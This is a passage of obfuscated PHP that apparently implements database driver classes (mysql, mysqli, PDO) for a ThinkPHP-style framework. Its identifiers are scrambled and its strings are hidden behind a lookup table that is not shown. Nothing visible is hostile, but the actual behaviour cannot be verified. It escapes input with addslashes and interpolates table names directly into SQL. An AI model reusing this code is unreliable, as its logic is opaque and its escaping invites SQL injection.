$ñ˜’ãï; if ($this->queryID) { $this->free(); } think_action_status($¼Š­ú»ì[23], 1); think_status($¼Š­ú»ì[24]); $this->queryID = mysql_query($ñ˜’ãï, $this->_linkID); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } } public function execute($øğ¡ˆéÍ) { $Ç¦èë®Ç =& $_SERVER[ê‘³Æ±]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $øğ¡ˆéÍ; if ($this->queryID) { $this->free(); } think_action_status($Ç¦èë®Ç[25], 1); think_status($Ç¦èë®Ç[24]); $¡›èñı¯ = mysql_query($øğ¡ˆéÍ, $this->_linkID); $this->debug(); if (!1 === $¡›èñı¯) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[ê‘³Æ±][883], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $†ûôíÚ = mysql_query($_SERVER[ê‘³Æ±][884], $this->_linkID); $this->transTimes = 0; if (!$†ûôíÚ) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $„€–”£’ = mysql_query($_SERVER[ê‘³Æ±][885], $this->_linkID); $this->transTimes = 0; if (!$„€–”£’) { $this->error(); return !1; } } return !0; } private function getAll() { $¿‘½¿Öí = array(); if ($this->numRows > 0) { while ($ñ†ÍÌ¨å = mysql_fetch_assoc($this->queryID)) { $¿‘½¿Öí[] = $ñ†ÍÌ¨å; } mysql_data_seek($this->queryID, 0); } return $¿‘½¿Öí; } public function getFields($ï…‹Ÿ¢) { $èšƒÈÀ =& $_SERVER[ê‘³Æ±]; $îîòùÆ„ = $this->query($èšƒÈÀ[886] . $this->parseKey($ï…‹Ÿ¢)); $õ¹ÉÚşÃ = array(); if ($îîòùÆ„) { foreach ($îîòùÆ„ as $ò÷ßğüü => $ƒ•£’ı—) { $õ¹ÉÚşÃ[$ƒ•£’ı—[$èšƒÈÀ[31]]] = array($èšƒÈÀ[32] => $ƒ•£’ı—[$èšƒÈÀ[31]], $èšƒÈÀ[33] => $ƒ•£’ı—[$èšƒÈÀ[34]], $èšƒÈÀ[35] => (bool) (strtoupper($ƒ•£’ı—[$èšƒÈÀ[36]]) === $èšƒÈÀ[887]), $èšƒÈÀ[37] => $ƒ•£’ı—[$èšƒÈÀ[38]], $èšƒÈÀ[39] => strtolower($ƒ•£’ı—[$èšƒÈÀ[40]]) == $èšƒÈÀ[41], $èšƒÈÀ[42] => strtolower($ƒ•£’ı—[$èšƒÈÀ[43]]) == $èšƒÈÀ[44]); } } return $õ¹ÉÚşÃ; } public function getTables($‹¶Æ±î = '') { $ÇÙŸ¸—Û =& $_SERVER[ê‘³Æ±]; if (!empty($‹¶Æ±î)) { $Ù¸–·ÚÎ = $ÇÙŸ¸—Û[888] . $‹¶Æ±î . $ÇÙŸ¸—Û[889]; } else { $Ù¸–·ÚÎ = $ÇÙŸ¸—Û[890]; } $òÎœéŸá = $this->query($Ù¸–·ÚÎ); $±±Ç÷™ = array(); foreach ($òÎœéŸá as $Î§Ü¯î’ => $îÁÚ÷½ö) { $±±Ç÷™[$Î§Ü¯î’] = current($îÁÚ÷½ö); } return $±±Ç÷™; } public function replace($½¤ƒï³ã, $ÎøšàùÛ = array()) { $ß·‘ =& $_SERVER[ê‘³Æ±]; foreach ($½¤ƒï³ã as $™åøæúâ => $¦òÃ£Æ÷) { $š´¹ËÖ = $this->parseValue($¦òÃ£Æ÷); if (is_scalar($š´¹ËÖ)) { $è•ë¶·Æ[] = $š´¹ËÖ; $Ù«³×Œ´[] = $this->parseKey($™åøæúâ); } } $ÊßçÌ¢é = $ß·‘[891] . $this->parseTable($ÎøšàùÛ[$ß·‘[276]]) . $ß·‘[892] . implode($ß·‘[50], $Ù«³×Œ´) . $ß·‘[893] . implode($ß·‘[50], $è•ë¶·Æ) . $ß·‘[894]; return $this->execute($ÊßçÌ¢é); } public function insertAll($¡ˆâ“ò¤, $Ëôâ¹—Ï = array(), $­©åÄèò = false) { $ÁßŸ…€ø =& $_SERVER[ê‘³Æ±]; if (!is_array($¡ˆâ“ò¤[0])) { return !1; } $Í÷Ôƒı = array_keys($¡ˆâ“ò¤[0]); $ÊË·Å˜ = array(); foreach ($¡ˆâ“ò¤ as $´÷©öí) { $üÁÍÇâ… = array(); foreach ($´÷©öí as $÷öĞ³½Û => $ŞŒêğ—›) { $ŞŒêğ—› = $this->parseValue($ŞŒêğ—›); if (is_scalar($ŞŒêğ—›)) { $üÁÍÇâ…[] = $ŞŒêğ—›; } } $ÊË·Å˜[] = $ÁßŸ…€ø[257] . implode($ÁßŸ…€ø[50], $üÁÍÇâ…) . $ÁßŸ…€ø[894]; } array_walk($Í÷Ôƒı, array($this, $ÁßŸ…€ø[895])); $ƒÓâ§¾ = ($­©åÄèò ? $ÁßŸ…€ø[896] : $ÁßŸ…€ø[897]) . $ÁßŸ…€ø[898] . $this->parseTable($Ëôâ¹—Ï[$ÁßŸ…€ø[276]]) . $ÁßŸ…€ø[892] . implode($ÁßŸ…€ø[50], $Í÷Ôƒı) . $ÁßŸ…€ø[899] . implode($ÁßŸ…€ø[50], $ÊË·Å˜); return $this->execute($ƒÓâ§¾); } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $À›‚˜ˆ˜ =& $_SERVER[ê‘³Æ±]; $this->error = mysql_errno() . $À›‚˜ˆ˜[4] . mysql_error($this->_linkID); if ($À›‚˜ˆ˜[12] != $this->queryStr) { $this->error .= LNG($À›‚˜ˆ˜[48]) . $this->queryStr; } think_trace($this->error, $À›‚˜ˆ˜[12], $À›‚˜ˆ˜[49]); return $this->error; } public function escapeString($×ÖÈ¼°) { if ($this->_linkID) { return mysql_real_escape_string($×ÖÈ¼°, $this->_linkID); } else { return mysql_escape_string($×ÖÈ¼°); } } public function parseKey(&$¸ı ¸ë¾, $¨Û©¡¬ú = true) { $Àú·™„” =& $_SERVER[ê‘³Æ±]; if ($¨Û©¡¬ú) { $¸ı ¸ë¾ = $this->parseKeyCheck($¸ı ¸ë¾); } if ($¸ı ¸ë¾ != $Àú·™„”[183] && !preg_match($Àú·™„”[900], $¸ı ¸ë¾)) { $¸ı ¸ë¾ = $Àú·™„”[382] . trim($¸ı ¸ë¾, $Àú·™„”[382]) . $Àú·™„”[382]; } return $¸ı ¸ë¾; } } class DbMysqli extends Db { public function __construct($‚ô¹³Æ = '') { $‹¿ã·ßØ =& $_SERVER[ê‘³Æ±]; if (!extension_loaded($‹¿ã·ßØ[901])) { think_exception(think_lang($‹¿ã·ßØ[14]) . $‹¿ã·ßØ[902]); } if (!empty($‚ô¹³Æ)) { $this->config = $‚ô¹³Æ; if (empty($this->config[$‹¿ã·ßØ[17]])) { $this->config[$‹¿ã·ßØ[17]] = $‹¿ã·ßØ[12]; } } } public function connect($ğö÷ƒÚ = '', $ƒÊõÒ’² = 0) { $§®Æ‰Ï =& $_SERVER[ê‘³Æ±]; if (!isset($this->linkID[$ƒÊõÒ’²])) { if (empty($ğö÷ƒÚ)) { $ğö÷ƒÚ = $this->config; } $this->linkID[$ƒÊõÒ’²] = new mysqli($ğö÷ƒÚ[$§®Æ‰Ï[875]], $ğö÷ƒÚ[$§®Æ‰Ï[877]], $ğö÷ƒÚ[$§®Æ‰Ï[878]], $ğö÷ƒÚ[$§®Æ‰Ï[21]], $ğö÷ƒÚ[$§®Æ‰Ï[876]] ? intval($ğö÷ƒÚ[$§®Æ‰Ï[876]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } $¿´Û¯ = $this->linkID[$ƒÊõÒ’²]->server_version; $this->linkID[$ƒÊõÒ’²]->query($§®Æ‰Ï[879] . think_config($§®Æ‰Ï[880]) . $§®Æ‰Ï[58]); if ($¿´Û¯ > $§®Æ‰Ï[881]) { $this->linkID[$ƒÊõÒ’²]->query($§®Æ‰Ï[882]); } $this->connected = !0; if (1 != think_config($§®Æ‰Ï[22])) { unset($this->config); } } return $this->linkID[$ƒÊõÒ’²]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($È·´Í»ì) { $ÎæÇÑô‹ =& $_SERVER[ê‘³Æ±]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $È·´Í»ì; if ($this->queryID) { $this->free(); } think_action_status($ÎæÇÑô‹[23], 1); think_status($ÎæÇÑô‹[24]); $this->queryID = $this->_linkID->query($È·´Í»ì); if ($this->_linkID->more_results()) { while (($ÜëşéÈç = $this->_linkID->next_result()) != NULL) { $ÜëşéÈç->free_result(); } } $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } } public function execute($±…æóò») { $‰áàô‚¼ =& $_SERVER[ê‘³Æ±]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $±…æóò»; if ($this->queryID) { $this->free(); } think_action_status($‰áàô‚¼[25], 1); think_status($‰áàô‚¼[24]); $‡Šïö÷‡ = $this->_linkID->query($±…æóò»); $this->debug(); if (!1 === $‡Šïö÷‡) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $¿Ã²½Ï· = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$¿Ã²½Ï·) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $şî£¯äÀ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$şî£¯äÀ) { $this->error(); return !1; } } return !0; } private function getAll() { $Àô½İö = array(); if ($this->numRows > 0) { for ($ş¾Û›³ë = 0; $ş¾Û›³ë < $this->numRows; $ş¾Û›³ë++) { $Àô½İö[$ş¾Û›³ë] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $Àô½İö; } public function getFields($¸û²Ëáò) { $Ğõƒ“ø€ =& $_SERVER[ê‘³Æ±]; $¹¤˜‚ = $this->query($Ğõƒ“ø€[886] . $this->parseKey($¸û²Ëáò)); $Ã¯öâÄ = array(); if ($¹¤˜‚) { foreach ($¹¤˜‚ as $ùÛš½õ => $üÓ…óƒÇ) { $Ã¯öâÄ[$üÓ…óƒÇ[$Ğõƒ“ø€[31]]] = array($Ğõƒ“ø€[32] => $üÓ…óƒÇ[$Ğõƒ“ø€[31]], $Ğõƒ“ø€[33] => $üÓ…óƒÇ[$Ğõƒ“ø€[34]], $Ğõƒ“ø€[35] => (bool) ($üÓ…óƒÇ[$Ğõƒ“ø€[36]] === $Ğõƒ“ø€[12]), $Ğõƒ“ø€[37] => $üÓ…óƒÇ[$Ğõƒ“ø€[38]], $Ğõƒ“ø€[39] => strtolower($üÓ…óƒÇ[$Ğõƒ“ø€[40]]) == $Ğõƒ“ø€[41], $Ğõƒ“ø€[42] => strtolower($üÓ…óƒÇ[$Ğõƒ“ø€[43]]) == $Ğõƒ“ø€[44]); } } return $Ã¯öâÄ; } public function getTables($‰¬ÆäÍ = '') { $çÆ÷…Êù =& $_SERVER[ê‘³Æ±]; $ñŠ†ÀæË = !empty($‰¬ÆäÍ) ? $çÆ÷…Êù[888] . $‰¬ÆäÍ . $çÆ÷…Êù[889] : $çÆ÷…Êù[890]; $¤¼„ò³ = $this->query($ñŠ†ÀæË); $ „ÊÉ = array(); if ($¤¼„ò³) { foreach ($¤¼„ò³ as $•ã×½†‰ => $´áÎÒù) { $ „ÊÉ[$•ã×½†‰] = current($´áÎÒù); } } return $ „ÊÉ; } public function replace($è†ÄØñ, $£¿¥•« = array()) { $Õ£ö¦ÍÇ =& $_SERVER[ê‘³Æ±]; foreach ($è†ÄØñ as $Ã”³— Û => $Ãœ×Ë¢) { $ˆÏÁ‚íõ = $this->parseValue($Ãœ×Ë¢); if (is_scalar($ˆÏÁ‚íõ)) { $«é¬ñ¾§[] = $ˆÏÁ‚íõ; $ÀïÚ¦è[] = $this->parseKey($Ã”³— Û); } } $•¾Üøïâ = $Õ£ö¦ÍÇ[891] . $this->parseTable($£¿¥•«[$Õ£ö¦ÍÇ[276]]) . $Õ£ö¦ÍÇ[892] . implode($Õ£ö¦ÍÇ[50], $ÀïÚ¦è) . $Õ£ö¦ÍÇ[893] . implode($Õ£ö¦ÍÇ[50], $«é¬ñ¾§) . $Õ£ö¦ÍÇ[894]; return $this->execute($•¾Üøïâ); } public function insertAll($®º¤ì÷ú, $”Ü¨—êÉ = array(), $©®´›‹  = false) { $Êé­êñ =& $_SERVER[ê‘³Æ±]; if (!is_array($®º¤ì÷ú[0])) { return !1; } $íÆÏ€»Ç = array_keys($®º¤ì÷ú[0]); $¢‘ÔŸ¼ş = array(); foreach ($®º¤ì÷ú as $¿úÔáğë) { $´¶ìŞ´ = array(); foreach ($¿úÔáğë as $ëÉ°ØÕ => $öÌŸ­áÅ) { $öÌŸ­áÅ = $this->parseValue($öÌŸ­áÅ); if (is_scalar($öÌŸ­áÅ)) { $´¶ìŞ´[] = $öÌŸ­áÅ; } } $¢‘ÔŸ¼ş[] = $Êé­êñ[257] . implode($Êé­êñ[50], $´¶ìŞ´) . $Êé­êñ[894]; } array_walk($íÆÏ€»Ç, array($this, $Êé­êñ[895])); $Î‡‚É‚¬ = $©®´›‹  ? $Êé­êñ[896] : $Êé­êñ[897]; $Ê‡ûäÔ = $Î‡‚É‚¬ . $Êé­êñ[898] . $this->parseTable($”Ü¨—êÉ[$Êé­êñ[276]]) . $Êé­êñ[892] . implode($Êé­êñ[50], $íÆÏ€»Ç) . $Êé­êñ[899] . implode($Êé­êñ[50], $¢‘ÔŸ¼ş); return $this->execute($Ê‡ûäÔ); } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $Ìè·ïË =& $_SERVER[ê‘³Æ±]; $this->error = $this->_linkID->errno . $Ìè·ïË[4] . $this->_linkID->error; if ($Ìè·ïË[12] != $this->queryStr) { $this->error .= LNG($Ìè·ïË[48]) . $this->queryStr; } think_trace($this->error, $Ìè·ïË[12], $Ìè·ïË[49]); return $this->error; } public function escapeString($§ÊšÉö†) { if ($this->_linkID) { return $this->_linkID->real_escape_string($§ÊšÉö†); } else { return addslashes($§ÊšÉö†); } } public function parseKey(&$°ù»¡Ó†, $êòÉ¨Æİ = true) { $Ñ»ÎÖĞº =& $_SERVER[ê‘³Æ±]; if ($êòÉ¨Æİ) { $°ù»¡Ó† = $this->parseKeyCheck($°ù»¡Ó†); } if ($°ù»¡Ó† != $Ñ»ÎÖĞº[183] && !preg_match($Ñ»ÎÖĞº[900], $°ù»¡Ó†)) { $°ù»¡Ó† = $Ñ»ÎÖĞº[382] . trim($°ù»¡Ó†, $Ñ»ÎÖĞº[382]) . $Ñ»ÎÖĞº[382]; } return $°ù»¡Ó†; } } class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($™«œêç = '') { $øã–›¦ª =& $_SERVER[ê‘³Æ±]; if (!class_exists($øã–›¦ª[903])) { think_exception(think_lang($øã–›¦ª[14]) . $øã–›¦ª[904]); } if (!empty($™«œêç)) { $this->config = $™«œêç; if (empty($this->config[$øã–›¦ª[17]])) { $this->config[$øã–›¦ª[17]] = array(); } } } public function connect($‡İ¨İ”Ÿ = '', $¾É½·ù“ = 0) { $Ï›ÖÖæî =& $_SERVER[ê‘³Æ±]; if (!isset($this->linkID[$¾É½·ù“])) { if (empty($‡İ¨İ”Ÿ)) { $‡İ¨İ”Ÿ = $this->config; } $§‹Ğˆğô = !empty($‡İ¨İ”Ÿ[$Ï›ÖÖæî[17]][$Ï›ÖÖæî[18]]) ? $‡İ¨İ”Ÿ[$Ï›ÖÖæî[17]][$Ï›ÖÖæî[18]] : $this->pconnect; if ($§‹Ğˆğô) { $‡İ¨İ”Ÿ[$Ï›ÖÖæî[17]][PDO::ATTR_PERSISTENT] = !0; } try { $this->linkID[$¾É½·ù“] = new PDO($‡İ¨İ”Ÿ[$Ï›ÖÖæî[905]], $‡İ¨İ”Ÿ[$Ï›ÖÖæî[877]], $‡İ¨İ”Ÿ[$Ï›ÖÖæî[878]], $‡İ¨İ”Ÿ[$Ï›ÖÖæî[17]]); } catch (PDOException $Š¯£ı’Ä) { think_exception($Š¯£ı’Ä->getMessage()); } $this->dbType = $this->_getDsnType($‡İ¨İ”Ÿ[$Ï›ÖÖæî[905]]); if (in_array($this->dbType, array($Ï›ÖÖæî[906], $Ï›ÖÖæî[907], $Ï›ÖÖæî[908], $Ï›ÖÖæî[909]))) { think_exception($Ï›ÖÖæî[910] . $this->dbType . $Ï›ÖÖæî[911] . $this->dbType . $Ï›ÖÖæî[912]); } if (!$this->linkID[$¾É½·ù“]) { think_exception($Ï›ÖÖæî[913]); } try { $this->linkID[$¾É½·ù“]->exec($Ï›ÖÖæî[914] . think_config($Ï›ÖÖæî[880])); } catch (Exception $Š¯£ı’Ä) { } $this->connected = !0; if (1 != think_config($Ï›ÖÖæî[22])) { unset($this->config); } } return $this->linkID[$¾É½·ù“]; } public function free() { $this->PDOStatement = null; } public function query($Ï’…ŸìÂ, $ì×º²±Ü = array()) { $£‰éµìÑ =& $_SERVER[ê‘³Æ±]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $Ï’…ŸìÂ; if (!empty($ì×º²±Ü)) { $this->queryStr .= $£‰éµìÑ[915] . print_r($ì×º²±Ü, !0) . $£‰éµìÑ[916]; } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($£‰éµìÑ[23], 1); think_status($£‰éµìÑ[24]); $this->PDOStatement = $this->_linkID->prepare($Ï’…ŸìÂ); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $¼‚şÂª… = $this->PDOStatement->execute($ì×º²±Ü); $this->debug(); if (!1 === $¼‚şÂª…) { $this->error(); return !1; } else { return $this->getAll(); } } public function execute($——ÑßÖ°, $ÀƒĞ°ŸÅ = array()) { $¹Ù÷¢£Ù =& $_SERVER[ê‘³Æ±]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $——ÑßÖ°; if (!empty($ÀƒĞ°ŸÅ)) { $this->queryStr .= $¹Ù÷¢£Ù[915] . print_r($ÀƒĞ°ŸÅ, !0) . $¹Ù÷¢£Ù[916]; } $û³†Åà = !1; if ($this->dbType == $¹Ù÷¢£Ù[909]) { if (preg_match($¹Ù÷¢£Ù[917], $this->queryStr, $ñé½ìˆ)) { $this->table = think_config($¹Ù÷¢£Ù[918]) . str_ireplace(think_config($¹Ù÷¢£Ù[919]), $¹Ù÷¢£Ù[375], $ñé½ìˆ[2]); $û³†Åà = (bool) $this->query($¹Ù÷¢£Ù[920] . strtoupper($this->table) . $¹Ù÷¢£Ù[58]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($¹Ù÷¢£Ù[25], 1); think_status($¹Ù÷¢£Ù[24]); $this->PDOStatement = $this->_linkID->prepare($——ÑßÖ°); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $Ğä•ÄïÍ = $this->PDOStatement->execute($ÀƒĞ°ŸÅ); $this->debug(); if (!1 === $Ğä•ÄïÍ) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($û³†Åà || preg_match($¹Ù÷¢£Ù[921], $——ÑßÖ°)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $è»àÖ³“ = $this->_linkID->commit(); $this->transTimes = 0; if (!$è»àÖ³“) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $Ÿ ¿õË = $this->_linkID->rollback(); $this->transTimes = 0; if (!$Ÿ ¿õË) { $this->error(); return !1; } } return !0; } private function getAll() { $ê²‡½† = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($ê²‡½†); return $ê²‡½†; } public function getFields($óÄğµœµ) { $Ôë©°Ã• =& $_SERVER[ê‘³Æ±]; $this->initConnect(!0); if (think_config($Ôë©°Ã•[922])) { $éşö Õ = str_replace($Ôë©°Ã•[923], $óÄğµœµ, think_config($Ôë©°Ã•[922])); } else { switch ($this->dbType) { case $Ôë©°Ã•[906]: case $Ôë©°Ã•[924]: $éşö Õ = "\123\105\x4c\x45\x43\x54\40\40\x20\143\x6f\x6c\165\155\156\x5f\x6e\x61\155\145\x20\x61\x73\x20\x27\116\x61\x6d\145\47\x2c\40\40\x20\144\141\164\x61\137\164\x79\x70\x65\x20\x61\163\x20\47\x54\171\160\145\x27\54\40\x20\x20\143\157\x6c\165\x6d\x6e\137\x64\145\146\141\x75\154\164\x20\141\163\x20\x27\x44\145\x66\x61\x75\154\x74\x27\x2c\x20\40\x20\151\x73\x5f\156\165\x6c\x6c\x61\x62\x6c\145\x20\141\163\x20\47\x4e\165\x6c\154\47\12\11\11\106\122\117\x4d\x9\151\x6e\146\x6f\162\x6d\x61\164\x69\x6f\156\x5f\163\x63\150\x65\155\141\56\x74\x61\142\154\x65\163\40\101\x53\x20\x74\xa\x9\11\112\117\111\x4e\11\x69\x6e\x66\157\x72\155\141\164\151\157\156\x5f\163\x63\150\145\x6d\141\56\x63\157\154\x75\155\156\163\x20\101\123\40\143\xa\x9\11\117\116\40\x20\164\x2e\164\141\142\154\145\x5f\x63\141\164\141\x6c\x6f\147\x20\75\40\x63\56\164\x61\142\x6c\145\137\143\141\164\141\x6c\157\147\12\x9\x9\x41\x4e\x44\40\164\56\164\141\x62\x6c\145\137\163\x63\x68\145\x6d\141\40\x3d\40\143\x2e\164\x61\x62\x6c\x65\x5f\x73\143\150\145\155\x61\xa\x9\11\101\x4e\104\x20\x74\x2e\164\141\142\154\145\137\x6e\x61\155\x65\40\75\40\143\56\164\141\142\154\145\x5f\156\141\155\x65\12\x9\11\127\x48\x45\122\x45\x20\40\x20\164\x2e\164\141\142\x6c\x65\x5f\156\141\155\145\x20\75\40\x27{$óÄğµœµ}\x27"; break; case $Ôë©°Ã•[925]: $éşö Õ = $Ôë©°Ã•[926] . $óÄğµœµ . $Ôë©°Ã•[927]; break; case $Ôë©°Ã•[907]: case $Ôë©°Ã•[909]: $éşö Õ = $Ôë©°Ã•[928] . $Ôë©°Ã•[929] . $Ôë©°Ã•[930] . strtoupper($óÄğµœµ) . $Ôë©°Ã•[931] . strtoupper($óÄğµœµ) . $Ôë©°Ã•[932]; break; case $Ôë©°Ã•[933]: $éşö Õ = $Ôë©°Ã•[934] . $óÄğµœµ . $Ôë©°Ã•[935]; break; case $Ôë©°Ã•[908]: break; case $Ôë©°Ã•[936]: default: $éşö Õ = $Ôë©°Ã•[937] . ($this->dbType == $Ôë©°Ã•[936] ? "\x60{$óÄğµœµ}\x60" : $óÄğµœµ); } } $ğºß»û = $this->query($éşö Õ); $šÃÔÒÅæ = array(); if ($ğºß»û) { foreach ($ğºß»û as $Á›Ê‰Û => $‹ø¥¯ş‚) { $‹ø¥¯ş‚ = array_change_key_case($‹ø¥¯ş‚); $‹ø¥¯ş‚[$Ôë©°Ã•[32]] = isset($‹ø¥¯ş‚[$Ôë©°Ã•[32]]) ? $‹ø¥¯ş‚[$Ôë©°Ã•[32]] : $Ôë©°Ã•[375]; $‹ø¥¯ş‚[$Ôë©°Ã•[33]] = isset($‹ø¥¯ş‚[$Ôë©°Ã•[33]]) ? $‹ø¥¯ş‚[$Ôë©°Ã•[33]] : $Ôë©°Ã•[375]; $©‰¢¸ıä = isset($‹ø¥¯ş‚[$Ôë©°Ã•[270]]) ? $‹ø¥¯ş‚[$Ôë©°Ã•[270]] : $‹ø¥¯ş‚[$Ôë©°Ã•[32]]; $šÃÔÒÅæ[$©‰¢¸ıä] = array($Ôë©°Ã•[32] => $©‰¢¸ıä, $Ôë©°Ã•[33] => $‹ø¥¯ş‚[$Ôë©°Ã•[33]], $Ôë©°Ã•[35] => (bool) (isset($‹ø¥¯ş‚[$Ôë©°Ã•[104]]) && $‹ø¥¯ş‚[$Ôë©°Ã•[104]] === $Ôë©°Ã•[12] || isset($‹ø¥¯ş‚[$Ôë©°Ã•[35]]) && $‹ø¥¯ş‚[$Ôë©°Ã•[35]] === $Ôë©°Ã•[12]), $Ôë©°Ã•[37] => isset($‹ø¥¯ş‚[$Ôë©°Ã•[37]]) ? $‹ø¥¯ş‚[$Ôë©°Ã•[37]] : (isset($‹ø¥¯ş‚[$Ôë©°Ã•[56]]) ? $‹ø¥¯ş‚[$Ôë©°Ã•[56]] : $Ôë©°Ã•[375]), $Ôë©°Ã•[39] => isset($‹ø¥¯ş‚[$Ôë©°Ã•[95]]) ? strtolower($‹ø¥¯ş‚[$Ôë©°Ã•[95]]) == $Ôë©°Ã•[41] : (isset($‹ø¥¯ş‚[$Ôë©°Ã•[57]]) ? $‹ø¥¯ş‚[$Ôë©°Ã•[57]] : !1), $Ôë©°Ã•[42] => isset($‹ø¥¯ş‚[$Ôë©°Ã•[938]]) ? strtolower($‹ø¥¯ş‚[$Ôë©°Ã•[938]]) == $Ôë©°Ã•[44] : (isset($‹ø¥¯ş‚[$Ôë©°Ã•[95]]) ? $‹ø¥¯ş‚[$Ôë©°Ã•[95]] : !1)); } } return $šÃÔÒÅæ; } public function getTables($ÖÉÄå‘ = '') { $„æ³“áµ =& $_SERVER[ê‘³Æ±]; if (think_config($„æ³“áµ[939])) { $ÁıŞ­ËÉ = str_replace($„æ³“áµ[940], $ÖÉÄå‘, think_config($„æ³“áµ[939])); } else { switch ($this->dbType) { case $„æ³“áµ[907]: case $„æ³“áµ[909]: $ÁıŞ­ËÉ = $„æ³“áµ[941]; break; case $„æ³“áµ[906]: case $„æ³“áµ[924]: $ÁıŞ­ËÉ = $„æ³“áµ[942]; break; case $„æ³“áµ[933]: $ÁıŞ­ËÉ = $„æ³“áµ[943]; break; case $„æ³“áµ[908]: think_exception(think_lang($„æ³“áµ[944]) . $„æ³“áµ[945]); break; case $„æ³“áµ[925]: $ÁıŞ­ËÉ = $„æ³“áµ[45] . $„æ³“áµ[46] . $„æ³“áµ[47]; break; case $„æ³“áµ[936]: default: if (!empty($ÖÉÄå‘)) { $ÁıŞ­ËÉ = $„æ³“áµ[888] . $ÖÉÄå‘ . $„æ³“áµ[889]; } else { $ÁıŞ­ËÉ = $„æ³“áµ[890]; } } } $”µøãŒ = $this->query($ÁıŞ­ËÉ); $—íÏÃÅ’ = array(); foreach ($”µøãŒ as $—‡”©Ù§ => $›²¸ìãó) { $—íÏÃÅ’[$—‡”©Ù§] = current($›²¸ìãó); } return $—íÏÃÅ’; } protected function parseLimit($œüÂœ¸×) { $Ù’˜æù =& $_SERVER[ê‘³Æ±]; $¼ıë»Ïı = $Ù’˜æù[12]; if (!empty($œüÂœ¸×)) { switch ($this->dbType) { case $Ù’˜æù[933]: case $Ù’˜æù[925]: $œüÂœ¸× = explode($Ù’˜æù[50], $œüÂœ¸×); if (count($œüÂœ¸×) > 1) { $¼ıë»Ïı .= $Ù’˜æù[51] . $œüÂœ¸×[1] . $Ù’˜æù[52] . $œüÂœ¸×[0] . $Ù’˜æù[53]; } else { $¼ıë»Ïı .= $Ù’˜æù[51] . $œüÂœ¸×[0] . $Ù’˜æù[53]; } break; case $Ù’˜æù[906]: case $Ù’˜æù[924]: break; case $Ù’˜æù[908]: break; case $Ù’˜æù[907]: case $Ù’˜æù[909]: break; case $Ù’˜æù[936]: default: $¼ıë»Ïı .= $Ù’˜æù[51] . $œüÂœ¸× . $Ù’˜æù[53]; } } return $¼ıë»Ïı; } public function parseKey(&$·€ğöÚª, $Û‡çø = true) { $ØïÖ¨Æ¶ =& $_SERVER[ê‘³Æ±]; if ($Û‡çø) { $·€ğöÚª = $this->parseKeyCheck($·€ğöÚª); } if ($this->dbType == $ØïÖ¨Æ¶[936]) { if ($·€ğöÚª != $ØïÖ¨Æ¶[183] && !preg_match($ØïÖ¨Æ¶[900], $·€ğöÚª)) { $·€ğöÚª = $ØïÖ¨Æ¶[382] . trim($·€ğöÚª, $ØïÖ¨Æ¶[382]) . $ØïÖ¨Æ¶[382]; } return $·€ğöÚª; } else { return parent::parseKey($·€ğöÚª, $Û‡çø); } } public function close() { $this->_linkID = null; } public function error() { $õˆí»¶Ì =& $_SERVER[ê‘³Æ±]; if ($this->PDOStatement) { $‹ğ›ÛŒ¹ = $this->PDOStatement->errorInfo(); $this->error = $‹ğ›ÛŒ¹[1] . $õˆí»¶Ì[4] . $‹ğ›ÛŒ¹[2]; } else { $this->error = $õˆí»¶Ì[12]; } if ($õˆí»¶Ì[12] != $this->queryStr) { $this->error .= LNG($õˆí»¶Ì[48]) . $this->queryStr; } think_trace($this->error, $õˆí»¶Ì[12], $õˆí»¶Ì[49]); return $this->error; } public function escapeString($‰ÆæÎ÷«) { $¦êæ£áÀ =& $_SERVER[ê‘³Æ±]; switch ($this->dbType) { case $¦êæ£áÀ[933]: case $¦êæ£áÀ[906]: case $¦êæ£áÀ[924]: case $¦êæ£áÀ[936]: return addslashes($‰ÆæÎ÷«); case $¦êæ£áÀ[908]: case $¦êæ£áÀ[925]: case $¦êæ£áÀ[907]: case $¦êæ£áÀ[909]: return str_ireplace($¦êæ£áÀ[58], $¦êæ£áÀ[59], $‰ÆæÎ÷«); } } protected function 